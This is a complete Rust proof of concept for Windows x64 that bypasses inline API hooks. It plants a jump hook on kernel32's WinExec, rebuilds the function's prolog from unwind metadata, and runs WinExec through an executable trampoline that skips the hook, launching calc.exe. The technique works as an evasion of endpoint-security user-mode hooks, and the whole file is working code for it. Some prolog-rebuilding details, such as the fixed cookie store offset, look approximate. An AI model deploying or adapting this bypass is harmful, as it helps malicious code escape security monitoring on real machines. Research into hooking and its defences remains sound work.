use std::mem;
use std::ptr;

use windows::core::PCSTR;
use windows::Win32::Foundation::HMODULE;
use windows::Win32::System::Diagnostics::Debug::IMAGE_RUNTIME_FUNCTION_ENTRY;
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u16; 29],
    e_lfanew: i32,
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
struct UnwindInfo {
    version_and_flags: u8,
    size_of_prolog: u8,
    count_of_codes: u8,
    frame_register_and_offset: u8,
}

// UNWIND_CODE operation types (from winnt.h)
const UWOP_PUSH_NONVOL: u8 = 0;
const UWOP_ALLOC_LARGE: u8 = 1;
const UWOP_ALLOC_SMALL: u8 = 2;
const UWOP_SAVE_NONVOL: u8 = 4;
const UWOP_SAVE_NONVOL_FAR: u8 = 5;
const UWOP_SAVE_XMM128: u8 = 8;
const UWOP_SAVE_XMM128_FAR: u8 = 9;

// x64 register indices in UNWIND_CODE.OpInfo
const REG_RBP: u8 = 5;

// PE header offsets (relative to OptionalHeader base)
// See: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
const PE_OPT_HDR_OFFSET: usize = 24;                // Offset from NT headers to Optional Header
const DATA_DIR_EXCEPTION_RVA: usize = 136;          // IMAGE_DIRECTORY_ENTRY_EXCEPTION (index 3)
const DATA_DIR_EXCEPTION_SIZE: usize = 140;
const DATA_DIR_LOAD_CONFIG_RVA: usize = 192;        // IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG (index 10)

// IMAGE_LOAD_CONFIG_DIRECTORY64 offsets
const LOAD_CONFIG_SECURITY_COOKIE: usize = 88;      // SecurityCookie VA (x64 only)

// UNWIND_INFO structure: codes start at offset 4 (after 4-byte header)
const UNWIND_INFO_CODES_OFFSET: usize = 4;

/// Get __security_cookie address from PE Load Config Directory
fn get_security_cookie(base: usize) -> Option<usize> {
    unsafe {
        let dos = &*(base as *const ImageDosHeader);
        let nt_headers = base + dos.e_lfanew as usize;
        let optional_header = nt_headers + PE_OPT_HDR_OFFSET;
        let load_config_rva = *((optional_header + DATA_DIR_LOAD_CONFIG_RVA) as *const u32);
        if load_config_rva == 0 { return None; }
        let load_config = base + load_config_rva as usize;
        let cookie_ptr = *((load_config + LOAD_CONFIG_SECURITY_COOKIE) as *const u64) as usize;
        if cookie_ptr != 0 { Some(cookie_ptr) } else { None }
    }
}

fn get_kernel32_base() -> usize {
    unsafe {
        GetModuleHandleA(PCSTR::from_raw(b"kernel32.dll\0".as_ptr()))
            .expect("Failed to get kernel32").0 as usize
    }
}

fn get_proc_addr(module: HMODULE, name: &str) -> Option<usize> {
    unsafe {
        let cname = format!("{}\0", name);
        GetProcAddress(module, PCSTR::from_raw(cname.as_ptr())).map(|p| p as usize)
    }
}

fn find_runtime_function(base: usize, func_rva: u32) -> Option<&'static IMAGE_RUNTIME_FUNCTION_ENTRY> {
    unsafe {
        let dos = &*(base as *const ImageDosHeader);
        let nt_headers = base + dos.e_lfanew as usize;
        let optional_header = nt_headers + PE_OPT_HDR_OFFSET;
        let exception_dir_rva = *((optional_header + DATA_DIR_EXCEPTION_RVA) as *const u32);
        let exception_dir_size = *((optional_header + DATA_DIR_EXCEPTION_SIZE) as *const u32);
        if exception_dir_rva == 0 { return None; }

        let pdata_start = base + exception_dir_rva as usize;
        let entry_size = mem::size_of::<IMAGE_RUNTIME_FUNCTION_ENTRY>();
        let num_entries = exception_dir_size as usize / entry_size;

        for i in 0..num_entries {
            let entry = &*((pdata_start + i * entry_size) as *const IMAGE_RUNTIME_FUNCTION_ENTRY);
            if func_rva >= entry.BeginAddress && func_rva < entry.EndAddress {
                return Some(entry);
            }
        }
        None
    }
}

/// Reconstruct function prolog from UNWIND_INFO metadata
fn reconstruct_prolog(base: usize, unwind_info_rva: u32, include_security_cookie: bool) -> Vec<u8> {
    unsafe {
        let unwind = &*((base + unwind_info_rva as usize) as *const UnwindInfo);
        let count_codes = unwind.count_of_codes as usize;
        if count_codes == 0 { return Vec::new(); }

        let codes_ptr = (base + unwind_info_rva as usize + UNWIND_INFO_CODES_OFFSET) as *const u16;
        let mut ops: Vec<(u8, u8, u32)> = Vec::new();
        let mut j = 0usize;
        let mut total_alloc: u32 = 0;
        let mut has_saves = false;
        let mut has_push_rbp = false;
        let mut alloc_size: u32 = 0;

        while j < count_codes {
            let code = *codes_ptr.add(j);
            let op = ((code >> 8) & 0xF) as u8;
            let info = ((code >> 12) & 0xF) as u8;

            let (extra_slots, extra_data) = match op {
                UWOP_SAVE_NONVOL => {
                    has_saves = true;
                    (1, if j + 1 < count_codes { *codes_ptr.add(j + 1) as u32 * 8 } else { 0 })
                }
                UWOP_SAVE_NONVOL_FAR => { has_saves = true; (2, 0) }
                UWOP_ALLOC_LARGE => {
                    let size = if info == 0 {
                        if j + 1 < count_codes { *codes_ptr.add(j + 1) as u32 * 8 } else { 0 }
                    } else {
                        if j + 2 < count_codes { (*codes_ptr.add(j + 1) as u32) | ((*codes_ptr.add(j + 2) as u32) << 16) } else { 0 }
                    };
                    total_alloc += size; alloc_size = size;
                    (if info == 0 { 1 } else { 2 }, size)
                }
                UWOP_ALLOC_SMALL => {
                    let size = (info as u32 + 1) * 8;
                    total_alloc += size; alloc_size = size;
                    (0, size)
                }
                UWOP_PUSH_NONVOL => {
                    total_alloc += 8;
                    if info == REG_RBP { has_push_rbp = true; }
                    (0, 0)
                }
                UWOP_SAVE_XMM128 => (1, 0),
                UWOP_SAVE_XMM128_FAR => (2, 0),
                _ => (0, 0),
            };
            ops.push((op, info, extra_data));
            j += 1 + extra_slots;
        }

        let mut out: Vec<u8> = Vec::new();

        // MOV RAX, RSP preserve original RSP for register saves
        if has_saves {
            out.extend_from_slice(&[
                0x48, 0x8B, 0xC4,  // mov rax, rsp
            ]);
        }

        // SAVE_NONVOL -> MOV [RAX+offset], reg
        for (op, info, extra_data) in ops.iter().rev() {
            if *op == UWOP_SAVE_NONVOL {
                let orig_off = extra_data.wrapping_sub(total_alloc);
                if orig_off <= 0x7F {
                    // 48 89 XX YY = mov [rax+YY], reg (where XX encodes reg)
                    out.extend_from_slice(&[
                        0x48,                    // REX.W prefix
                        0x89,                    // MOV r/m64, r64
                        0x40 | (*info << 3),     // ModR/M: [RAX+disp8], reg
                        orig_off as u8,          // disp8
                    ]);
                }
            }
        }

        // PUSH operations
        for (op, info, _) in ops.iter().rev() {
            if *op == UWOP_PUSH_NONVOL {
                if *info < 8 {
                    // push rax=50, rcx=51, rdx=52, rbx=53, rsp=54, rbp=55, rsi=56, rdi=57
                    if *info >= 3 {
                        out.push(0x40);  // REX prefix (required for rbx, rsp, rbp, rsi, rdi)
                    }
                    out.push(0x50 + info);  // push reg
                } else {
                    // push r8-r15 require REX.B prefix
                    out.extend_from_slice(&[
                        0x41,                // REX.B prefix
                        0x50 + (info - 8),   // push r8-r15
                    ]);
                }
            }
        }

        // LEA RBP, [RAX-offset] frame pointer setup
        if has_push_rbp && has_saves && alloc_size > 0 {
            let off = (alloc_size + 8) as i8;
            out.extend_from_slice(&[
                0x48,                    // REX.W prefix
                0x8D,                    // LEA
                0x68,                    // ModR/M: RBP, [RAX+disp8]
                (-(off as i32)) as u8,   // negative displacement
            ]);
        }

        // ALLOC operations -> SUB RSP, size
        for (op, info, extra_data) in ops.iter().rev() {
            match *op {
                UWOP_ALLOC_SMALL => {
                    let size = (*info as u32 + 1) * 8;
                    out.extend_from_slice(&[
                        0x48,           // REX.W prefix
                        0x83,           // SUB r/m64, imm8
                        0xEC,           // ModR/M: RSP
                        size as u8,     // imm8
                    ]);
                }
                UWOP_ALLOC_LARGE => {
                    if *extra_data <= 128 {
                        out.extend_from_slice(&[
                            0x48,                 // REX.W prefix
                            0x83,                 // SUB r/m64, imm8
                            0xEC,                 // ModR/M: RSP
                            *extra_data as u8,    // imm8
                        ]);
                    } else {
                        out.extend_from_slice(&[
                            0x48,  // REX.W prefix
                            0x81,  // SUB r/m64, imm32
                            0xEC,  // ModR/M: RSP
                        ]);
                        out.extend_from_slice(&extra_data.to_le_bytes());  // imm32
                    }
                }
                _ => {}
            }
        }

        // Security cookie setup from LDR
        if include_security_cookie {
            if let Some(cookie_addr) = get_security_cookie(base) {
                out.extend_from_slice(&[0x48, 0xB8]);  // mov rax, imm64
                out.extend_from_slice(&(cookie_addr as u64).to_le_bytes());
                out.extend_from_slice(&[0x48, 0x8B, 0x00]);  // mov rax, [rax]
                out.extend_from_slice(&[0x48, 0x33, 0xC4]);  // xor rax, rsp
                out.extend_from_slice(&[0x48, 0x89, 0x45, 0x20]);  // mov [rbp+0x20], rax
            }
        }

        out
    }
}

/// Build executable trampoline from reconstructed bytes
fn build_trampoline(reconstructed: &[u8], original_func: usize, prolog_size: usize) -> Option<*mut u8> {
    if reconstructed.is_empty() { return None; }

    let size = reconstructed.len() + 14;
    let trampoline = unsafe {
        VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    };
    if trampoline.is_null() { return None; }

    let trampoline = trampoline as *mut u8;
    unsafe {
        ptr::copy_nonoverlapping(reconstructed.as_ptr(), trampoline, reconstructed.len());
        let jmp_loc = trampoline.add(reconstructed.len());
        let jmp_target = original_func + prolog_size;
        // FF 25 00 00 00 00 = jmp qword ptr [rip+0] (absolute indirect jump)
        // followed by 8-byte target address
        *jmp_loc = 0xFF;              // JMP opcode
        *jmp_loc.add(1) = 0x25;       // ModR/M: [RIP+disp32]
        ptr::write_bytes(jmp_loc.add(2), 0, 4);  // disp32 = 0 (address follows immediately)
        ptr::write_unaligned(jmp_loc.add(6) as *mut u64, jmp_target as u64);  // absolute target
    }
    Some(trampoline)
}

/// Install inline hook
fn install_hook(target: usize) -> [u8; 16] {
    unsafe {
        let mut original = [0u8; 16];
        ptr::copy_nonoverlapping(target as *const u8, original.as_mut_ptr(), 16);
        let mut old = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(target as *const _, 16, PAGE_READWRITE, &mut old).unwrap();
        // E9 XX XX XX XX = jmp rel32 (relative jump, 5 bytes total)
        // 0x00001000 = +4096 bytes forward (a reasonable handler offset)
        ptr::copy_nonoverlapping(
            [
                0xE9,        // JMP rel32 opcode
                0x00, 0x10, 0x00, 0x00,  // rel32 = 0x00001000 (+4096)
            ].as_ptr(),
            target as *mut u8,
            5
        );
        VirtualProtect(target as *const _, 16, old, &mut old).unwrap();
        original
    }
}

fn main() {
    let kernel32 = get_kernel32_base();
    let kernel32_h = HMODULE(kernel32 as *mut _);
    let winexec = get_proc_addr(kernel32_h, "WinExec").expect("WinExec not found");
    let winexec_rva = (winexec - kernel32) as u32;
    let rt = find_runtime_function(kernel32, winexec_rva).expect("No RUNTIME_FUNCTION");
    let unwind_rva = unsafe { rt.Anonymous.UnwindInfoAddress };
    let unwind = unsafe { &*((kernel32 + unwind_rva as usize) as *const UnwindInfo) };
    let prolog_size = unwind.size_of_prolog as usize;

    println!("Target: WinExec @ 0x{:X}", winexec);
    println!("Prolog size: {} bytes", prolog_size);

    if let Some(cookie) = get_security_cookie(kernel32) {
        println!("Security cookie: 0x{:X}", cookie);
    }

    // Show original bytes
    print!("\nOriginal: ");
    unsafe {
        for b in std::slice::from_raw_parts(winexec as *const u8, 16) {
            print!("{:02X} ", b);
        }
    }
    println!();

    // Install hook
    let _orig = install_hook(winexec);
    print!("Balls sniffed at: ");
    unsafe {
        for b in std::slice::from_raw_parts(winexec as *const u8, 16) {
            print!("{:02X} ", b);
        }
    }
    println!(" <- E9 JMP");

    // Reconstruct prolog from metadata (NOT from hooked memory)
    let reconstructed = reconstruct_prolog(kernel32, unwind_rva, true);
    print!("\nReconstructed: ");
    for b in &reconstructed {
        print!("{:02X} ", b);
    }
    println!(" ({} bytes from metadata)", reconstructed.len());

    // Build trampoline
    let trampoline = build_trampoline(&reconstructed, winexec, prolog_size)
        .expect("Failed to build trampoline");
    println!("\nTrampoline @ 0x{:X}", trampoline as usize);

    // Execute through trampoline
    println!("\nCalling WinExec via trampoline...");
    type WinExecFn = unsafe extern "system" fn(*const u8, u32) -> u32;
    let f: WinExecFn = unsafe { mem::transmute(trampoline) };
    let result = unsafe { f(b"calc.exe\0".as_ptr(), 1) };

    if result > 31 {
        println!("\ncalc.exe spawned!");
        print!("Hook still in place: ");
        unsafe {
            for b in std::slice::from_raw_parts(winexec as *const u8, 5) {
                print!("{:02X} ", b);
            }
        }
        println!();
    } else {
        println!("WinExec failed: {}", result);
    }

    println!("\nPress Enter to exit");
    let _ = std::io::stdin().read_line(&mut String::new());
}
